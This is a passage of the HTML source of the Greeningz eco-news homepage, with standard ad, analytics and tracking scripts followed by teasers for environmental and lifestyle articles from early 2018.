<!doctype html>
<html class="no-js" lang="en-US" prefix="og: http://ogp.me/ns#">
<head>
	<meta charset="UTF-8">
	<meta name="description" content="">
	<meta name="viewport" content="width=device-width, initial-scale=1">

	<link rel="shortcut icon" type="image/png"
	      href="http://greeningz.com/wp-content/themes/greeningz/favicon.png"/>


	<title>Greeningz | Greening Together</title>

<!-- This site is optimized with the Yoast SEO plugin v3.4.2 - https://yoast.com/wordpress/plugins/seo/ -->
<meta name="description" content="Greeningz was started in order to bring two of our favourite topics together - Eco Friendliness and entertainment. We work hard to bring you all relevant updates about your favourite entertainment niches and eco friendly stories. We encourage you to share and take part in our community."/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="http://greeningz.com/" />
<link rel="next" href="http://greeningz.com/page/2/" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="website" />
<meta property="og:title" content="Greeningz | Greening Together" />
<meta property="og:description" content="Greeningz was started in order to bring two of our favourite topics together - Eco Friendliness and entertainment. We work hard to bring you all relevant updates about your favourite entertainment niches and eco friendly stories. We encourage you to share and take part in our community." />
<meta property="og:url" content="http://greeningz.com/" />
<meta property="og:site_name" content="Greeningz" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:description" content="Greeningz was started in order to bring two of our favourite topics together - Eco Friendliness and entertainment. We work hard to bring you all relevant updates about your favourite entertainment niches and eco friendly stories. We encourage you to share and take part in our community." />
<meta name="twitter:title" content="Greeningz | Greening Together" />
<script type='application/ld+json'>{"@context":"http:\/\/schema.org","@type":"WebSite","url":"http:\/\/greeningz.com\/","name":"Greeningz","potentialAction":{"@type":"SearchAction","target":"http:\/\/greeningz.com\/?s={search_term_string}","query-input":"required name=search_term_string"}}</script>
<!-- / Yoast SEO plugin. -->

<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Greeningz &raquo; Feed" href="http://greeningz.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Greeningz &raquo; Comments Feed" href="http://greeningz.com/comments/feed/" />
<link rel='stylesheet' id='greeningz-style-main-css'  href='http://greeningz.com/wp-content/themes/greeningz/styles/main.css?ver=4.8.5' type='text/css' media='all' />
<link rel='stylesheet' id='greeningz-style-css'  href='http://greeningz.com/wp-content/themes/greeningz/style.css?ver=4.8.5' type='text/css' media='all' />
<script type='text/javascript' src='http://greeningz.com/wp-content/themes/greeningz/scripts/vendor.js?ver=4.8.5'></script>
<script type='text/javascript' src='http://greeningz.com/wp-content/themes/greeningz/scripts/vendor/modernizr.js?ver=4.8.5'></script>
<link rel='https://api.w.org/' href='http://greeningz.com/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://greeningz.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://greeningz.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 4.8.5" />
    <script>
      function storage(key, value) {
          var lsSupport = false;
          // Check for native support
          if (sessionStorage) {
              lsSupport = true;
          }
          // Value supplied, set new or modify store
          if (typeof value !== "undefined" && value !== null) {
              if (typeof value === 'object') {
                  value = JSON.stringify(value);
              }
              if (lsSupport) {
                  sessionStorage.setItem(key, value);
              } else {
                  createCookie(key, value, 30);
              }
          }
          // No value supplied, return value
          else if (typeof value === "undefined") {
              if (lsSupport) {
                  data = sessionStorage.getItem(key);
              } else {
                  data = readCookie(key);
              }
              return data;
          }
          // Null specified, remove store
          else if (value === null) {
              if (lsSupport) {
                  sessionStorage.removeItem(key);
              } else {
                  createCookie(key, '', -1);
              }
          }
          /**
           * Creates new cookie or removes cookie with negative expiration
           * @param  key       The key or identifier for the store
           * @param  value     Contents of the store
           * @param  exp       Expiration - creation defaults to 30 days
           */
          function createCookie(key, value, exp) {
              var date = new Date();
              date.setTime(date.getTime() + (exp * 24 * 60 * 60 * 1000));
              var expires = "; expires=" + date.toGMTString();
              document.cookie = key + "=" + value + expires + "; path=/";
          }
          /**
           * Returns contents of cookie
           * @param  key       The key or identifier for the store
           */
          function readCookie(key) {
              var nameEQ = key + "=";
              var ca = document.cookie.split(';');
              for (var i = 0, max = ca.length; i < max; i++) {
                  var c = ca[i];
                  while (c.charAt(0) === ' ') c = c.substring(1, c.length);
                  if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
              }
              return null;
          }
      }

      function getParameterByName(name) {
          name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
          var regex = new RegExp('[\\?&]' + name + '=([^&#]*)'),
              results = regex.exec(location.search);
          return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
      }

      function getUtmSource(){
          var STORAGE_SOURCE_KEY = 'cm_tracker_utm_source';
          var source = getParameterByName('utm_source');
          return source ? source : (storage(STORAGE_SOURCE_KEY) && storage(STORAGE_SOURCE_KEY) !== '' ? storage(STORAGE_SOURCE_KEY) : 'direct');
      }

      function getUtmCampaign(){
          var SOURCE_CAMPAIGN_KEY = 'cm_tracker_utm_campaign';
          var campaign = getParameterByName('utm_campaign');
          return campaign ? campaign : (storage(SOURCE_CAMPAIGN_KEY) && storage(SOURCE_CAMPAIGN_KEY) !== '' ? storage(SOURCE_CAMPAIGN_KEY) : 'direct');
      }

      function getUtmMedium(){
          var SOURCE_MEDIUM_KEY = 'cm_tracker_utm_medium';
          var medium = getParameterByName('utm_medium');
          return medium ? medium : (storage(SOURCE_MEDIUM_KEY) && storage(SOURCE_MEDIUM_KEY) !== '' ? storage(SOURCE_MEDIUM_KEY) : 'direct');
      }

      function getPageNumber(){
          var index = (document.location.pathname[document.location.pathname.length - 1] == '/')? 2 : 1;
          var number = Number(document.location.pathname.split('/')[document.location.pathname.split('/').length - index]);
          return number? number : 1;
      }
    </script>

    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<script>
 (adsbygoogle = window.adsbygoogle || []).push({
   google_ad_client: "ca-pub-2428728305118953",
   enable_page_level_ads: true
 });
</script>

<script type="text/javascript">
  var taboola_account = 'greening';
  var taboola_platform =  'desktop';
  
  var STORAGE_SOURCE_KEY = 'cm_tracker_utm_source';
  var taboola_source = getParameterByName('utm_source');
  taboola_source = taboola_source ? taboola_source : (storage(STORAGE_SOURCE_KEY) && storage(STORAGE_SOURCE_KEY) !== '' ? storage(STORAGE_SOURCE_KEY) : 'direct');
  taboola_source = taboola_source.toLowerCase();

  if (taboola_platform == 'mobile') {
    if (taboola_source == 'taboola') {
      taboola_account += 'smt';
    }
    else if (taboola_source == 'facebook') {
      taboola_account += 'smf';
    }
    else {
      taboola_account += 'smr';
    }
  }
  else if (taboola_platform == 'desktop') {
    if (taboola_source == 'taboola') {
      taboola_account += 'sdt';
    }
    else {
      taboola_account += 'sdr';
    }
  }
  else if (taboola_platform == 'tablet') {
      taboola_account += 'z';
  }

  window._taboola = window._taboola || [];
  _taboola.push({article:'auto'});
  !function (e, f, u, i) {
    if (!document.getElementById(i)){
      e.async = 1;
      e.src = u;
      e.id = i;
      f.parentNode.insertBefore(e, f);
    }
  }(document.createElement('script'),
  document.getElementsByTagName('script')[0],
  '//cdn.taboola.com/libtrc/' + taboola_account + '/loader.js',
  'tb_loader_script');
</script>

<!-- GA -->
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-89147165-1', 'auto');
  ga('send', 'pageview');

</script>

<!-- UNDERDOGMEDIA UTM Tracking Code Start -->
<script data-cfasync="false" language="javascript" async src="//bid.underdog.media/udm_tracker.js"></script>
<!-- UNDERDOGMEDIA UTM Tracking Code End -->

<!-- Begin comScore Tag -->
<script>
  var _comscore = _comscore || [];
  _comscore.push({ c1: "2", c2: "20535424" });
  (function() {
    var s = document.createElement("script"), el = document.getElementsByTagName("script")[0]; s.async = true;
    s.src = (document.location.protocol == "https:" ? "https://sb" : "http://b") + ".scorecardresearch.com/beacon.js";
    el.parentNode.insertBefore(s, el);
  })();
</script>
<noscript>
  <img src="http://b.scorecardresearch.com/p?c1=2&c2=20535424&cv=2.0&cj=1" />
</noscript>
<!-- End comScore Tag -->

<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.9";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script><link rel="icon" href="http://dtayjcy3tbkw.cloudfront.net/wp-content/uploads/2016/12/23101827/cropped-greeningz_32-32x32.gif" sizes="32x32" />
<link rel="icon" href="http://dtayjcy3tbkw.cloudfront.net/wp-content/uploads/2016/12/23101827/cropped-greeningz_32-192x192.gif" sizes="192x192" />
<link rel="apple-touch-icon-precomposed" href="http://dtayjcy3tbkw.cloudfront.net/wp-content/uploads/2016/12/23101827/cropped-greeningz_32-180x180.gif" />
<meta name="msapplication-TileImage" content="http://dtayjcy3tbkw.cloudfront.net/wp-content/uploads/2016/12/23101827/cropped-greeningz_32-270x270.gif" />
<script type='text/javascript'>var PREBID_TIMEOUT = 1600; var adUnits = eval(atob("W10="));var pbjs = pbjs || {}; pbjs.que = pbjs.que || []; pbjs.bidderSettings = {aol: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.8;}},sekindo: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.8;}},districtmDMX: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.85;}},brealtime: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.95;}},springserve: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.85;}},sharethrough: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.9;}}};</script>

   <script type="text/javascript" src="//d1upt0rqzff34l.cloudfront.net/GZ/prebid.js" async></script>

   <script>
    var googletag = googletag || {};
    googletag.cmd = googletag.cmd || [];
    googletag.cmd.push(function() {
        googletag.pubads().disableInitialLoad();
        googletag.pubads().collapseEmptyDivs(true);
        googletag.pubads().setTargeting("pageNumber", String(getPageNumber()));
        googletag.pubads().setTargeting("utmSource", getUtmSource());
    });

     
            !function(a9,a,p,s,t,A,g){if(a[a9])return;function q(c,r){a[a9]._Q.push([c,r])}a[a9]={init:function(){q("i",arguments)},fetchBids:function(){q("f",arguments)},setDisplayBids:function(){},targetingKeys:function(){return[]},_Q:[]};A=p.createElement(s);A.async=!0;A.src=t;g=p.getElementsByTagName(s)[0];g.parentNode.insertBefore(A,g)}("apstag",window,document,"script","//c.amazon-adsystem.com/aax2/apstag.js");

            apstag.init({pubID: 'a9f35723-4b6d-49e7-a931-f8fce6c4e9ca', adServer: 'googletag'});

            apstag.fetchBids({
                slots: [
                    
                        {slotName: '/202308823/GZ-Desktop-Low', sizes: [[728, 90]], slotID: 'ad_pos_gz-desktop-low'},
                        {slotName: '/202308823/GZ-Desktop-Top', sizes: [[728, 90]], slotID: 'ad_pos_gz-desktop-top'},
                        {slotName: '/202308823/GZ-RR-ATF', sizes: [[300, 250]], slotID: 'ad_pos_gz-rr-atf'},
                        {slotName: '/202308823/GZ-RR-BTF', sizes: [[300, 250]], slotID: 'ad_pos_gz-rr-btf'},
                        {slotName: '/202308823/GZ-RR-MID', sizes: [[300, 250], [300, 600]], slotID: 'ad_pos_gz-rr-mid'},
                                        ],
                timeout: 2e3
            }, function(bids) {
                googletag.cmd.push(function(){
                    apstag.setDisplayBids();
                });
            });
        
    pbjs.que.push(function() {
        pbjs.setPriceGranularity({
            "buckets" : [{
                "precision": 2,
                "min" : 0,
                "max" : 3,
                "increment" : 0.01
            },
                {
                    "precision": 2,
                    "min" : 3,
                    "max" : 5,
                    "increment" : 0.05
                },
                {
                    "precision": 2,
                    "min" : 5,
                    "max" : 10,
                    "increment" : 0.1
                },
                {
                    "precision": 2,
                    "min" : 10,
                    "max" : 30,
                    "increment" : 0.5
                }]
        });
        pbjs.addAdUnits(adUnits);
        pbjs.requestBids({
            bidsBackHandler: sendAdserverRequest
        });
    });

	// Add the below code snippet to your page
	pbjs.que.push(function() {
	    pbjs.enableAnalytics({
	        provider: 'cmv2'
	    });
	});

    function sendAdserverRequest() {
        if (pbjs.adserverRequestSent) return;
        pbjs.adserverRequestSent = true;
        googletag.cmd.push(function() {
            pbjs.que.push(function() {
                pbjs.setTargetingForGPTAsync();
                googletag.pubads().refresh();
            });
        });
    }

    setTimeout(function() {
        sendAdserverRequest();
    }, PREBID_TIMEOUT);



  </script>

  <script>
    (function () {
        var gads = document.createElement('script');
        gads.async = true;
        gads.type = 'text/javascript';
        var useSSL = 'https:' == document.location.protocol;
        gads.src = (useSSL ? 'https:' : 'http:') +
                '//www.googletagservices.com/tag/js/gpt.js';
        var node = document.getElementsByTagName('script')[0];
        node.parentNode.insertBefore(gads, node);
    })();
  </script>

<script>
		googletag.cmd.push(function () {
					googletag.defineSlot('/202308823/GZ-Desktop-Low', [728, 90], 'ad_pos_gz-desktop-low').addService(googletag.pubads());
			googletag.defineSlot('/202308823/GZ-Desktop-Top', [728, 90], 'ad_pos_gz-desktop-top').addService(googletag.pubads());
			googletag.defineOutOfPageSlot('/202308823/GZ-EDGE', 'ad_pos_gz-edge').addService(googletag.pubads());
			googletag.defineSlot('/202308823/GZ-RR-ATF', [300, 250], 'ad_pos_gz-rr-atf').addService(googletag.pubads());
			googletag.defineSlot('/202308823/GZ-RR-BTF', [300, 250], 'ad_pos_gz-rr-btf').addService(googletag.pubads());
			googletag.defineSlot('/202308823/GZ-RR-MID', [[300, 250], [300, 600]], 'ad_pos_gz-rr-mid').addService(googletag.pubads());

			
        googletag.pubads().enableSingleRequest();
        googletag.enableServices();


    });
  </script>

	 </head>
<body class="home blog">
<script src="http://d1rlca3pqma1yp.cloudfront.net/minder-tracker.js"></script>
<!--[if lt IE 10]>
<p class="browserupgrade">You are using an <strong>outdated</strong> browser.
	Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve
	your experience.</p>
<![endif]-->
<header id="top_header" class="navbar-fixed-top">
<nav class="navbar navbar-default" id="top_nav">
	<div class="container">
		<div class="navbar-header">
			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar"
			        aria-expanded="false" aria-controls="navbar">
				<span class="sr-only">Toggle navigation</span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
			</button>
			<a class="navbar-brand" href="http://greeningz.com">
									<img src="http://dtayjcy3tbkw.cloudfront.net/wp-content/uploads/2016/12/08085240/greeningz_32.gif" alt="Greeningz" class="logo-image img-responsive">
							</a>
		</div>
		<!-- Collect the nav links, forms, and other content for toggling -->
		<div class="collapse navbar-collapse navbar-right"
		     id="navbar">
			<div class="flex-wrap">
				<ul id="menu-top-menu" class="nav navbar-nav"><li id="menu-item-472" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-472"><a title="Eco-Friendly" href="http://greeningz.com/category/eco-friendly/">Eco-Friendly</a></li>
<li id="menu-item-4217" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-4217"><a title="Lifestyle" href="http://greeningz.com/category/lifestyle/">Lifestyle</a></li>
<li id="menu-item-4218" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-4218"><a title="Sustainability" href="http://greeningz.com/category/sustainability/">Sustainability</a></li>
<li id="menu-item-4219" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-4219"><a title="GreEntertainment" href="http://greeningz.com/category/greentertainment/">GreEntertainment</a></li>
<li id="menu-item-4220" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-4220"><a title="Ecotourism" href="http://greeningz.com/category/ecotourism/">Ecotourism</a></li>
</ul>			</div>
		</div><!-- /.navbar-collapse -->
	</div>
</nav>
</header>
<div id="second_top_nav" class="hidden-xs">
	<div class="container">
		<div class="row">
					</div>
	</div>
</div>
<main id="main_content">
	<div id="banner">
	<div class="container">
		<div class="row">
			<div class="col-xs-12">
				<div class="top_block_big">
										<article>
				<a href="http://greeningz.com/sustainability/white-rhinos-dreadfully-close-extinction/" class="wrapp_item">
					<div class="img_article" style="background-image: url('http://dtayjcy3tbkw.cloudfront.net/wp-content/uploads/2018/03/21151441/Sudan-White-Rhino-e1521645287728.jpg')"></div>
					<div class="item_text">
						<p class="category_name"><span class="icon-leaf "><img src="http://greeningz.com/wp-content/themes/greeningz/images/leaf.png"></span>&nbsp;Interesting</p>
						<h2 class="header_item">White Rhinos Dreadfully Close To Extinction</h2>
						<p class="meta_item"><span class="author_name"> John Poe </span> - <span class="date_item">13 hours ago</span></p>
					</div>
				</a>
			</article>

			</div><!--top_block_big-->				<div class="top_block_small">
						<article class="hidden-xs">
			<a href="http://greeningz.com/interesting/giant-colony-penguins-discovered-antarctica/"  class="wrapp_item">
				<div class="img_item"  style="background-image: url('http://dtayjcy3tbkw.cloudfront.net/wp-content/uploads/2018/03/18145758/Penguin-Supercolony-e1521385089467.jpg')"></div>
				<div class="item_text">
					<p class="category_name"><span class="icon-leaf"><img src="http://greeningz.com/wp-content/themes/greeningz/images/leaf.png"></span>&nbsp;Interesting</p>
					<h2 class="header_item">Giant Colony of Penguins Discovered In Antarctica</h2>
				</div>
			</a>
		</article>

								<article class="hidden-xs">
			<a href="http://greeningz.com/interesting/oil-coal-mining-actually-reason-reduction-bears-ears-national-monument/"  class="wrapp_item">
				<div class="img_item"  style="background-image: url('http://dtayjcy3tbkw.cloudfront.net/wp-content/uploads/2018/03/16151424/Bears-Ears-Oil-and-Coal-e1521213273384.jpg')"></div>
				<div class="item_text">
					<p class="category_name"><span class="icon-leaf"><img src="http://greeningz.com/wp-content/themes/greeningz/images/leaf.png"></span>&nbsp;Interesting</p>
					<h2 class="header_item">Oil And Coal Mining Could Actually Be A Reason For The Reduction Of The Bears Ears National Monument</h2>
				</div>
			</a>
		</article>

								<article class="">
			<a href="http://greeningz.com/eco-friendly/diesel-vehicles-europe-rapidly-decline/"  class="wrapp_item">
				<div class="img_item"  style="background-image: url('http://dtayjcy3tbkw.cloudfront.net/wp-content/uploads/2018/03/13141852/European-Diesel-Ban-e1520950740791.jpg')"></div>
				<div class="item_text">
					<p class="category_name"><span class="icon-leaf"><img src="http://greeningz.com/wp-content/themes/greeningz/images/leaf.png"></span>&nbsp;Eco-Friendly</p>
					<h2 class="header_item">Diesel Vehicles In Europe Are About To Rapidly Decline</h2>
				</div>
			</a>
		</article>

								<article class="">
			<a href="http://greeningz.com/lifestyle/responsible-green-minded-consumers-putting-serious-pressure-major-utility-companies/"  class="wrapp_item">
				<div class="img_item"  style="background-image: url('http://dtayjcy3tbkw.cloudfront.net/wp-content/uploads/2018/03/09154352/Solar-Panels-e1520610335934.jpg')"></div>
				<div class="item_text">
					<p class="category_name"><span class="icon-leaf"><img src="http://greeningz.com/wp-content/themes/greeningz/images/leaf.png"></span>&nbsp;Eco-Friendly</p>
					<h2 class="header_item">Responsible And Green-Minded Consumers Are Putting Serious Pressure On Major Utility Companies</h2>
				</div>
			</a>
		</article>

		</div><!--top_block_small-->
			</div>
		</div>
	</div>
</div>	<div id="social">
	<div class="container">
		<div class="row">
			<div class="col-xs-12">
				<div class="row">
					<div class="wrap_social clearfix">
						<h2 class="head_social">get social!</h2>
						<div class="item_social_wrap">
<!--							<a href="//www.youtube.com" target="_blank" class="you_tube item_social">-->
<!--							</a>-->
							<a href="https://twitter.com/Greeningz_Com/" target="_blank" class="twitter item_social"><img src="http://greeningz.com/wp-content/themes/greeningz/images/twitter87.jpeg">
							</a>
							<a href="https://www.facebook.com/greeningzcom/" target="_blank" class="facebook item_social"><img src="http://greeningz.com/wp-content/themes/greeningz/images/fb87.png">
							</a>
						</div>

					</div>
											<div id="text-6" class="widget_text wrap_ads hidden-xs hidden-sm"><div class="ads">			<div class="textwidget">
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- GZ D Floor WW (Dynamic) -->
<ins class="adsbygoogle"
     style="display:inline-block;width:728px;height:90px"
     data-ad-client="ca-pub-2428728305118953"
     data-ad-slot="3656254829"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>

</div>
		</div></div>
									</div>
			</div>
		</div>
	</div>
</div>	<div id="three_blocks">
	<div class="container">
		<div class="row">
			<div class="col-xs-12">
				<div class="three_blocks_item_wrap clearfix">
					<div class="three_blocks_item three_blocks_item_left">

										<a href="http://greeningz.com/interesting/5-ways-go-green-kitchen/">
				<p class="tb_top_meta">Interesting</p>
				<div class="tb_img_wrap">
					<div class="tb_img" style="background-image: url('http://dtayjcy3tbkw.cloudfront.net/wp-content/uploads/2018/03/09180703/Mason-Jars-In-The-Fridge-389x222.jpg')"></div>
				</div>
				<h2 class="tb_head">5 Ways To Go Green In The Kitchen</h2>
				<p class="tb_text">



The kitchen provides a lot of opportunities for going green. You can replace old appliances with newer, energy-efficient models and learn to...</p>
				<p class="tb_slogan"></p>
				<p class="tb_category">Interesting</p>
			</a>
			
</div>					
<div class="three_blocks_item three_blocks_item_center">
	<p class="tbcb_head">Don’t Miss</p>
							<div class="tbcb_item">
				<a href="http://greeningz.com/interesting/intelligent-speed-assistance-may-arriving-soon-european-autos/">
					<h2 class="tbcb_item_head">“Intelligent Speed Assistance” May Be Arriving Soon In European Autos</h2>
					<p class="tbcb_item_meta">
						<span class="tbcb_item_author">John Poe</span> - <span class="tbcb_item_date">March 12, 2018</span>
					</p>
				</a>
			</div>
									<div class="tbcb_item">
				<a href="http://greeningz.com/sustainability/lego-announces-release-sustainable-play-pieces/">
					<h2 class="tbcb_item_head">LEGO Announces Release Of Sustainable Play Pieces</h2>
					<p class="tbcb_item_meta">
						<span class="tbcb_item_author">Steve Becker</span> - <span class="tbcb_item_date">March 10, 2018</span>
					</p>
				</a>
			</div>
									<div class="tbcb_item">
				<a href="http://greeningz.com/lifestyle/start-seeds-budget/">
					<h2 class="tbcb_item_head">How To Start Your Own Seeds On A Budget</h2>
					<p class="tbcb_item_meta">
						<span class="tbcb_item_author">John Poe</span> - <span class="tbcb_item_date">March 8, 2018</span>
					</p>
				</a>
			</div>
			</div>					
<div class="three_blocks_item three_blocks_item_right">

										<a href="http://greeningz.com/lifestyle/4-options-generating-power-off-grid/">
				<p class="tb_top_meta">Lifestyle</p>
				<div class="tb_img_wrap">
					<div class="tb_img" style="background-image: url('http://dtayjcy3tbkw.cloudfront.net/wp-content/uploads/2016/11/28151854/flowing-stream.jpg')"></div>
				</div>
				<h2 class="tb_head">Cut the Ties:  4 Options for Generating Power Off the Grid</h2>
				<p class="tb_text">So the idea of severing utility bills from your life and maintaining an existence completely independent from power companies has got your interest...</p>
				<p class="tb_slogan"></p>
				<p class="tb_category">Lifestyle</p>
			</a>
			
</div>				</div>
			</div>
		</div>
	</div>
</div>	
<div id="wide_block">
	<div class="container">
		<div class="row">
			<div class="col-xs-12 col-sm-8 hidden-xs">
				
						<div class="wb_wide">
			<a href="http://greeningz.com/lifestyle/apples-really-can-keep-doctor-away/">
				<div class="wb_wide_img_wrap">
					<div class="wb_wide_img" style="background-image: url('http://dtayjcy3tbkw.cloudfront.net/wp-content/uploads/2018/02/26173618/Apples-and-heart-health-600x259.jpg')"></div>
				</div>
				<h2 class="wb_wide_head">How Apples Really CAN Keep A Doctor Away</h2>
				<p class="wb_wide_text">



We’ve all heard the old saying “An apple a day keeps the doctor away,” but have we ever actually given it much thought? While the phrase...</p>
				<p class="wb_wide_meta">Interesting</p>
			</a>
		</div>
					</div>
			<div class="col-xs-12 col-sm-4 wb_right_wrapp">
				
						<div class="wb_right">
			<a href="http://greeningz.com/interesting/oldest-known-icelandic-sea-eagle-saved-farmer/">
				<div class="wb_right_img_wrap">
					<div class="wb_right_img" style="background-image: url('http://dtayjcy3tbkw.cloudfront.net/wp-content/uploads/2018/02/21224938/Farmer-Finds-Icelandic-Sea-Eagle.jpg')"></div>
				</div>
				<h2 class="wb_right_text">Oldest-Known Icelandic Sea Eagle Saved By Farmer</h2></a>
		</div>
								<div class="wb_right">
			<a href="http://greeningz.com/lifestyle/utility-executives-predict-wind-solar-power-cheaper-traditional-coal-within-5-years/">
				<div class="wb_right_img_wrap">
					<div class="wb_right_img" style="background-image: url('http://dtayjcy3tbkw.cloudfront.net/wp-content/uploads/2018/02/21192639/Solar-and-Wind-Field-e1519241207181.jpg')"></div>
				</div>
				<h2 class="wb_right_text">Utility Executives Predict That Wind And Solar Power Could Be Cheaper Than Traditional Coal Within 5 Years</h2></a>
		</div>
								<div class="wb_right">
			<a href="http://greeningz.com/interesting/10-interesting-ways-use-aluminum-foil/">
				<div class="wb_right_img_wrap">
					<div class="wb_right_img" style="background-image: url('http://dtayjcy3tbkw.cloudfront.net/wp-content/uploads/2018/02/23152109/Rust-Removal-e1519399277516.jpg')"></div>
				</div>
				<h2 class="wb_right_text">10 Interesting Ways To Use Aluminum Foil</h2></a>
		</div>
								<div class="wb_right">
			<a href="http://greeningz.com/eco-friendly/top-green-cruise-lines/">
				<div class="wb_right_img_wrap">
					<div class="wb_right_img" style="background-image: url('http://dtayjcy3tbkw.cloudfront.net/wp-content/uploads/2018/02/16203414/Cunard-Cruise-Line-Queen-Mary-2-e1518813351814.jpg')"></div>
				</div>
				<h2 class="wb_right_text">Top Green Cruise Lines</h2></a>
		</div>
					</div>
		</div>
	</div>
</div>		<div id="main_block">
	<div class="container">
		<div class="row">
			<div class="col-xs-12">
				<div class="main_block_item_wrap clearfix">
																										<div class="main_block_item">
								<a href="http://greeningz.com/eco-friendly/indoor-gardening-kits-make-easy-grow-food/">
									<div class="mb_img_wrap">
										<div class="mb_img" style="background-image: url('http://dtayjcy3tbkw.cloudfront.net/wp-content/uploads/2018/02/19180620/Back-to-the-Roots-Herbs-e1519063626425.jpg')"></div>
									</div>

									<h2 class="mb_head">Indoor Gardening Kits Make It Easy To Grow Your Own Food</h2>
									<p class="mb_text">



&nbsp;

For many, the icy grip of winter is still very much upon us, and the thought of gardening outside is still a distant dream....</p>
								</a>

							</div>
																												<div class="main_block_item">
								<a href="http://greeningz.com/eco-friendly/company-netherlands-creates-shared-workspaces-shipping-containers/">
									<div class="mb_img_wrap">
										<div class="mb_img" style="background-image: url('http://dtayjcy3tbkw.cloudfront.net/wp-content/uploads/2018/02/18193859/Shipping-Container-Offices-e1518982752458.jpg')"></div>
									</div>

									<h2 class="mb_head">Company In The Netherlands Creates Shared Workspaces Out Of Shipping Containers</h2>
									<p class="mb_text">





Shared workspaces are nothing new. Small business owners have been taking advantage of the concept for many years now. It’s a great way...</p>
								</a>

							</div>
																												<div class="main_block_item">
								<a href="http://greeningz.com/lifestyle/greenest-countries-world/">
									<div class="mb_img_wrap">
										<div class="mb_img" style="background-image: url('http://dtayjcy3tbkw.cloudfront.net/wp-content/uploads/2018/02/14223612/Finland-e1518647791601.jpg')"></div>
									</div>

									<h2 class="mb_head">What Are The Greenest Countries In The World?</h2>
									<p class="mb_text">



Earth day is fast approaching (April 22), and if you’re looking to celebrate by taking a trip, we have a list of the greenest countries in...</p>
								</a>

							</div>
																												<div class="main_block_item">
								<a href="http://greeningz.com/lifestyle/important-powerless-tools-hand/">
									<div class="mb_img_wrap">
										<div class="mb_img" style="background-image: url('http://dtayjcy3tbkw.cloudfront.net/wp-content/uploads/2018/02/12180033/Screwdrivers-e1518458469936.jpg')"></div>
									</div>

									<h2 class="mb_head">The Most Important Powerless Tools You Should Have On Hand</h2>
									<p class="mb_text">



Having tools around the house that don’t require batteries or electricity is a good idea. First off, in the event of an emergency situation,...</p>
								</a>

							</div>
																												<div class="main_block_item">
								<a href="http://greeningz.com/eco-friendly/dubai-plans-construct-largest-waste-energy-facility-world/">
									<div class="mb_img_wrap">
										<div class="mb_img" style="background-image: url('http://dtayjcy3tbkw.cloudfront.net/wp-content/uploads/2018/02/09171711/Dubai-waste-to-energy-plant-e1518196877641.jpg')"></div>
									</div>

									<h2 class="mb_head">Dubai Plans To Construct Largest Waste-To-Energy Facility In The World</h2>
									<p class="mb_text">





Dubai is no stranger to building some pretty impressive structural marvels. Now, the city that’s home to the tallest building in the...</p>
								</a>

							</div>
																												<div class="main_block_item">
								<a href="http://greeningz.com/eco-friendly/worlds-largest-ivory-market-votes-ban-ivory-trade/">
									<div class="mb_img_wrap">
										<div class="mb_img" style="background-image: url('http://dtayjcy3tbkw.cloudfront.net/wp-content/uploads/2018/02/06175743/Asian-Elephant-e1517939882909.jpg')"></div>
									</div>

									<h2 class="mb_head">World’s Largest Ivory Market Votes To Ban Ivory Trade</h2>
									<p class="mb_text">





Lawmakers in Hong Kong recently submitted a historic vote to ban the trade of ivory. The vote will result in Ivory sales completely...</p>
								</a>

							</div>
																												<div class="main_block_item">
								<a href="http://greeningz.com/interesting/truck-driver-destroys-2000-year-old-nazca-lines-peru/">
									<div class="mb_img_wrap">
										<div class="mb_img" style="background-image: url('http://dtayjcy3tbkw.cloudfront.net/wp-content/uploads/2018/02/05191448/Nazca-Lines-2-e1517858270306.jpg')"></div>
									</div>

									<h2 class="mb_head">Truck Driver Destroys 2000-Year-Old Nazca Lines In Peru</h2>
									<p class="mb_text">





On January 27th, 2018, a 40-year-old truck driver named Jainer Jesus Flores Vigo was arrested for driving his semi-truck over Peru’s...</p>
								</a>

							</div>
																												<div class="main_block_item">
								<a href="http://greeningz.com/interesting/conservation-groups-plan-lawsuit-land-exchange-deal-alaskas-izembek-national-wildlife-refuge/">
									<div class="mb_img_wrap">
